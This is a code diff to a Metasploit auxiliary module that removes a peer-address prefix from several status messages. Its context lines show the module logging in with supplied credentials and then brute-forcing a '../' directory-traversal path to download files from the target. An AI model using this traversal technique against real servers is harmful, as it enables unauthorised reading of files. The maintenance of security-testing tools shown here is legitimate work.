@@ -136,7 +136,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       return nil
     rescue Rex::ConnectionRefused
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
   end
@@ -160,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
     if cookie.nil?
       fail_with(Failure::Unknown, "#{peer} - Failed to log in with the provided credentials.")
     else
-      print_good("#{peer} - Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.")
+      print_good("Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.")
       store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie) # more consistent service_name and protocol
     end
 
@@ -176,7 +176,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_error("#{peer} - File not found, using bruteforce to attempt to download the file")
+    print_error("File not found, using bruteforce to attempt to download the file")
     count = 1
     while count < datastore['DEPTH']
       res = download_file(('../' * count).chomp('/') + filepath, cookie)
@@ -187,6 +187,6 @@ class MetasploitModule < Msf::Auxiliary
       count += 1
     end
 
-    print_error("#{peer} - Failed to download file.")
+    print_error("Failed to download file.")
   end
 end
